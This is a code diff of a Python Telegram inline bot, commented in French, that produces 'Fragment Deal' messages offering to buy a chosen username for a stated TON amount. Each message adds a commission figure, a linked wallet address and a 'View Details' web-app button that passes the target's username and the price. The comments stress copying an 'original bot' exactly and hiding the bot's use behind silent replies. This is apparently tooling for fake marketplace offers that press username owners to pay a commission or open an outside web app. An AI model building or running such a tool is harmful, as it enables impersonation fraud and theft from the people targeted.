@@ -82,7 +82,72 @@ Important:
 • Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
 • If you choose not to proceed, simply ignore this message."""
     
-    return fragment_message, wallet_address, commission, commission_usd
+    # Création des entités pour le formatage
+    entities = []
+    
+    # 1. Offer Amount en gras
+    offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
+    offer_start = fragment_message.find(offer_text)
+    if offer_start != -1:
+        entities.append(MessageEntity(
+            type=MessageEntity.BOLD,
+            offset=offer_start,
+            length=len(offer_text)
+        ))
+    
+    # 2. Commission en gras
+    commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
+    commission_start = fragment_message.find(commission_text)
+    if commission_start != -1:
+        entities.append(MessageEntity(
+            type=MessageEntity.BOLD,
+            offset=commission_start,
+            length=len(commission_text)
+        ))
+    
+    # 3. Premier point Important en gras
+    important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
+    important_start1 = fragment_message.find(important_text1)
+    if important_start1 != -1:
+        entities.append(MessageEntity(
+            type=MessageEntity.BOLD,
+            offset=important_start1,
+            length=len(important_text1)
+        ))
+    
+    # 4. Deuxième point Important en gras
+    important_text2 = "• If you choose not to proceed, simply ignore this message."
+    important_start2 = fragment_message.find(important_text2)
+    if important_start2 != -1:
+        entities.append(MessageEntity(
+            type=MessageEntity.BOLD,
+            offset=important_start2,
+            length=len(important_text2)
+        ))
+    
+    # 5. Wallet cliquable - LONGUEUR CORRECTE (48 caractères: UQ...PR)
+    wallet_start = fragment_message.find(wallet_address)
+    if wallet_start != -1:
+        entities.append(MessageEntity(
+            type=MessageEntity.TEXT_LINK,
+            offset=wallet_start,
+            length=48,  # Longueur exacte de UQ...PR (48 caractères)
+            url=f"https://tonviewer.com/{wallet_address}"
+        ))
+        print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
+    
+    # 📱 BOUTON WEB APP INTÉGRÉ - Reste dans Telegram
+    webapp_url = f"{WEBAPP_URL}?user={username}&price={price:g}"
+    keyboard = InlineKeyboardMarkup([[
+        InlineKeyboardButton(
+            "View Details", 
+            web_app=WebAppInfo(url=webapp_url)
+        )
+    ]])
+    
+    print(f"🔗 Web App URL générée (intégrée): {webapp_url}")
+    
+    return fragment_message, entities, keyboard
 
 async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Gestionnaire des requêtes inline"""
@@ -91,48 +156,17 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         
         query = update.inline_query.query.strip() if update.inline_query.query else ""
         
-        # Si pas de requête - AFFICHER L'AIDE
+        # Si pas de requête OU format incorrect - AUCUNE RÉPONSE (utilisation privée)
         if not query:
-            results = [
-                InlineQueryResultArticle(
-                    id="help_usage",
-                    title="💡 Comment utiliser ce bot",
-                    description="Format: @username montant (ex: alice 5.5)",
-                    input_message_content=InputTextMessageContent(
-                        message_text="ℹ️ Utilisation du bot Fragment Deal Generator:\n\n"
-                                   "Format: **@username montant**\n"
-                                   "Exemple: `alice 5.5` ou `@bob 10`\n\n"
-                                   "Ce format génère un message de deal Fragment professionnel.",
-                        parse_mode='Markdown'
-                    )
-                )
-            ]
-            await update.inline_query.answer(results, cache_time=1)
+            await update.inline_query.answer([], cache_time=0)
             return
         
         # Parsing de la requête (username montant)
         parts = query.split()
         
-        # Si format incorrect - AFFICHER L'AIDE ET SUGGESTION
+        # Si format incorrect - AUCUNE RÉPONSE (utilisation privée)
         if len(parts) < 2:
-            results = [
-                InlineQueryResultArticle(
-                    id="help_format",
-                    title="⚠️ Format incorrect",
-                    description=f"Tapé: '{query}' - Format attendu: username montant",
-                    input_message_content=InputTextMessageContent(
-                        message_text="❌ Format incorrect détecté\n\n"
-                                   f"Vous avez tapé: `{query}`\n"
-                                   "Format correct: **@username montant**\n\n"
-                                   "Exemples:\n"
-                                   "• `alice 5.5`\n"
-                                   "• `@bob 10`\n"
-                                   "• `charlie 2.75`",
-                        parse_mode='Markdown'
-                    )
-                )
-            ]
-            await update.inline_query.answer(results, cache_time=1)
+            await update.inline_query.answer([], cache_time=0)
             return
         
         username = parts[0].replace('@', '')  # Supprime @ si présent
@@ -142,143 +176,70 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             if ton_amount <= 0:
                 raise ValueError("Montant doit être positif")
         except ValueError:
-            # Si montant invalide - AFFICHER ERREUR INFORMATIVE
-            results = [
-                InlineQueryResultArticle(
-                    id="error_amount",
-                    title="❌ Montant invalide",
-                    description=f"'{parts[1]}' n'est pas un montant valide",
-                    input_message_content=InputTextMessageContent(
-                        message_text="⚠️ Montant invalide détecté\n\n"
-                                   f"Username: `@{username}` ✅\n"
-                                   f"Montant: `{parts[1]}` ❌\n\n"
-                                   "Le montant doit être:\n"
-                                   "• Un nombre positif\n"
-                                   "• Exemples valides: 5, 10.5, 2.75",
-                        parse_mode='Markdown'
-                    )
-                )
-            ]
-            await update.inline_query.answer(results, cache_time=1)
+            # Si montant invalide - AUCUNE RÉPONSE (utilisation privée)
+            await update.inline_query.answer([], cache_time=0)
             return
         
-        # Génération du message Fragment - EXACTEMENT identique au bot original
-        fragment_message, wallet_address, commission, commission_usd = generate_fragment_message(username, ton_amount)
+        # Génération du message avec le format exact du bot original
+        fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
         
-        # Calcul pour la description
-        ton_price = get_ton_price()
-        price_usd = ton_amount * ton_price
+        # Prix actuel pour l'affichage
+        current_ton_price = get_ton_price()
+        current_usd_value = ton_amount * current_ton_price
         
-        # Création des entités pour le formatage - EXACTEMENT identique au bot original
-        entities = []
-        
-        # 1. Offer Amount en gras
-        offer_text = f"• Offer Amount: 💎{ton_amount:g} (${price_usd:.2f} USD)"
-        offer_start = fragment_message.find(offer_text)
-        if offer_start != -1:
-            entities.append(MessageEntity(
-                type=MessageEntity.BOLD,
-                offset=offer_start,
-                length=len(offer_text)
-            ))
-        
-        # 2. Commission en gras
-        commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
-        commission_start = fragment_message.find(commission_text)
-        if commission_start != -1:
-            entities.append(MessageEntity(
-                type=MessageEntity.BOLD,
-                offset=commission_start,
-                length=len(commission_text)
-            ))
-        
-        # 3. Premier point Important en gras
-        important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
-        important_start1 = fragment_message.find(important_text1)
-        if important_start1 != -1:
-            entities.append(MessageEntity(
-                type=MessageEntity.BOLD,
-                offset=important_start1,
-                length=len(important_text1)
-            ))
-        
-        # 4. Deuxième point Important en gras
-        important_text2 = "• If you choose not to proceed, simply ignore this message."
-        important_start2 = fragment_message.find(important_text2)
-        if important_start2 != -1:
-            entities.append(MessageEntity(
-                type=MessageEntity.BOLD,
-                offset=important_start2,
-                length=len(important_text2)
-            ))
-        
-        # 5. Wallet cliquable - LONGUEUR CORRECTE (48 caractères: UQ...PR)
-        wallet_start = fragment_message.find(wallet_address)
-        if wallet_start != -1:
-            entities.append(MessageEntity(
-                type=MessageEntity.TEXT_LINK,
-                offset=wallet_start,
-                length=48,  # Longueur exacte de UQ...PR (48 caractères)
-                url=f"https://tonviewer.com/{wallet_address}"
-            ))
-            print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
-        
-        # UN SEUL bouton - EXACTEMENT comme dans le bot original
-        keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("🌐 Mini App", web_app=WebAppInfo(url=WEBAPP_URL))]
-        ])
-        
-        # Résultat inline
+        # Résultat inline - SEULEMENT si format correct
         results = [
             InlineQueryResultArticle(
-                id=f"fragment_deal_{username}_{ton_amount}",
+                id=f"deal_{username}_{ton_amount}_{int(time.time())}",
                 title=f"Fragment Deal: @{username}",
-                description=f"💰 {ton_amount} TON (${price_usd:.2f} USD) - Commission: {commission:g} TON",
+                description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
                 input_message_content=InputTextMessageContent(
-                    message_text=fragment_message,
-                    entities=entities
+                    fragment_message,
+                    entities=entities,
+                    disable_web_page_preview=True  # ✅ DÉSACTIVE L'APERÇU DES LIENS
                 ),
-                reply_markup=keyboard,
-                thumb_url="https://i.imgur.com/fragment.png"
+                reply_markup=keyboard
             )
         ]
         
-        print(f"✅ Deal généré: @{username} pour {ton_amount} TON (${price_usd:.2f} USD)")
-        await update.inline_query.answer(results, cache_time=1)
+        await update.inline_query.answer(results, cache_time=0)
+        print(f"✅ Réponse inline envoyée: {username} - {ton_amount} TON (${current_usd_value:.2f})")
         
     except Exception as e:
         print(f"❌ Erreur dans inline_query_handler: {e}")
-        # En cas d'erreur, afficher un message d'erreur informatif
-        error_results = [
-            InlineQueryResultArticle(
-                id="error_general",
-                title="🔧 Erreur technique",
-                description="Une erreur est survenue, veuillez réessayer",
-                input_message_content=InputTextMessageContent(
-                    message_text="⚠️ Une erreur technique est survenue\n\n"
-                               "Veuillez réessayer avec le format: `username montant`",
-                    parse_mode='Markdown'
-                )
-            )
-        ]
-        await update.inline_query.answer(error_results, cache_time=1)
 
 class WebhookHandler(BaseHTTPRequestHandler):
+    """Gestionnaire webhook HTTP simple"""
+    
     def do_POST(self):
-        """Traite les webhooks de Telegram"""
+        """Gestion des requêtes POST"""
+        global app, event_loop
+        
         try:
-            content_length = int(self.headers.get('Content-Length', 0))
+            if self.path != f'/{BOT_TOKEN}':
+                self.send_response(404)
+                self.end_headers()
+                return
+            
+            # Lecture des données
+            content_length = int(self.headers.get('content-length', 0))
             post_data = self.rfile.read(content_length)
             
-            # Traitement asynchrone du webhook
-            if event_loop and not event_loop.is_closed():
+            # Parse JSON
+            update_data = json.loads(post_data.decode('utf-8'))
+            
+            # Traitement asynchrone
+            if app and event_loop:
                 asyncio.run_coroutine_threadsafe(
-                    self.process_webhook(post_data), 
+                    process_update(update_data),
                     event_loop
                 )
             
+            # Réponse OK
             self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
             self.end_headers()
+            self.wfile.write(b'{"ok":true}')
             
         except Exception as e:
             print(f"❌ Erreur webhook: {e}")
@@ -297,103 +258,63 @@ class WebhookHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         """Désactiver les logs HTTP"""
         pass
-    
-    async def process_webhook(self, post_data):
-        """Traite les données du webhook de manière asynchrone"""
-        try:
-            if app:
-                update_data = json.loads(post_data.decode('utf-8'))
-                update = Update.de_json(update_data, app.bot)
-                await app.process_update(update)
-        except Exception as e:
-            print(f"❌ Erreur traitement webhook: {e}")
 
-async def setup_application():
-    """Configuration de l'application Telegram"""
+async def process_update(update_data):
+    """Traitement des updates Telegram"""
     global app
     
-    print("⚙️ Configuration de l'application...")
-    app = Application.builder().token(BOT_TOKEN).build()
-    
-    # Ajout du handler inline
-    app.add_handler(InlineQueryHandler(inline_query_handler))
-    
-    print("🔗 Configuration des handlers terminée")
-    return app
-
-async def setup_webhook():
-    """Configuration du webhook"""
     try:
-        print("🌐 Configuration du webhook...")
-        
-        webhook_url = f"{WEBHOOK_URL}/"
-        
-        # Configuration du webhook avec requête HTTP directe
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook"
-        data = json.dumps({
-            "url": webhook_url,
-            "allowed_updates": ["inline_query"]
-        }).encode('utf-8')
-        
-        req = urllib.request.Request(
-            url, 
-            data=data, 
-            headers={'Content-Type': 'application/json'}
-        )
-        
-        with urllib.request.urlopen(req) as response:
-            result = json.loads(response.read().decode('utf-8'))
-            
-            if result.get('ok'):
-                print(f"✅ Webhook configuré: {webhook_url}")
-                return True
-            else:
-                print(f"❌ Erreur webhook: {result}")
-                return False
-                
+        if app:
+            update = Update.de_json(update_data, app.bot)
+            if update:
+                await app.process_update(update)
     except Exception as e:
-        print(f"❌ Erreur configuration webhook: {e}")
-        return False
+        print(f"❌ Erreur traitement update: {e}")
 
-def start_http_server():
-    """Démarre le serveur HTTP"""
+def run_webhook_server():
+    """Démarre le serveur webhook"""
     try:
-        print(f"🌍 Démarrage serveur HTTP sur port {PORT}...")
         server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
+        print(f"🌐 Serveur webhook démarré sur le port {PORT}")
         server.serve_forever()
     except Exception as e:
-        print(f"❌ Erreur serveur HTTP: {e}")
+        print(f"❌ Erreur serveur webhook: {e}")
 
 async def setup_bot():
-    """Configuration complète du bot"""
-    global event_loop
+    """Configuration du bot"""
+    global app, event_loop
     
-    # Sauvegarde de la boucle d'événements
-    event_loop = asyncio.get_event_loop()
-    
-    # Configuration de l'application
-    await setup_application()
-    
-    # Configuration du webhook
-    webhook_success = await setup_webhook()
-    if not webhook_success:
-        print("❌ Échec configuration webhook")
-        return
-    
-    # Démarrage du serveur HTTP dans un thread séparé
-    server_thread = threading.Thread(target=start_http_server, daemon=True)
-    server_thread.start()
-    
-    print("🚀 Bot inline Fragment Deal démarré!")
-    print(f"📱 Web App intégrée: {WEBAPP_URL}")
-    print("💡 Utilisez le bot en inline: @votre_bot_username alice 5.5")
-    
-    # Maintient le bot en vie
     try:
+        # Création de l'application
+        app = Application.builder().token(BOT_TOKEN).build()
+        
+        # Ajout du gestionnaire inline
+        app.add_handler(InlineQueryHandler(inline_query_handler))
+        
+        # Initialisation
+        await app.initialize()
+        await app.start()
+        
+        # Configuration du webhook
+        webhook_url = f"{WEBHOOK_URL}/{BOT_TOKEN}"
+        await app.bot.set_webhook(url=webhook_url)
+        
+        print(f"✅ Bot initialisé avec webhook: {webhook_url}")
+        
+        # Garde l'event loop actif
+        event_loop = asyncio.get_event_loop()
+        
+        # Démarrage du serveur webhook dans un thread séparé
+        webhook_thread = threading.Thread(target=run_webhook_server, daemon=True)
+        webhook_thread.start()
+        
+        # Attente infinie
         while True:
             await asyncio.sleep(1)
-    except KeyboardInterrupt:
-        print("🛑 Arrêt du bot...")
+            
+    except Exception as e:
+        print(f"❌ Erreur setup bot: {e}")
+        raise
 
 def main():
     """Fonction principale"""
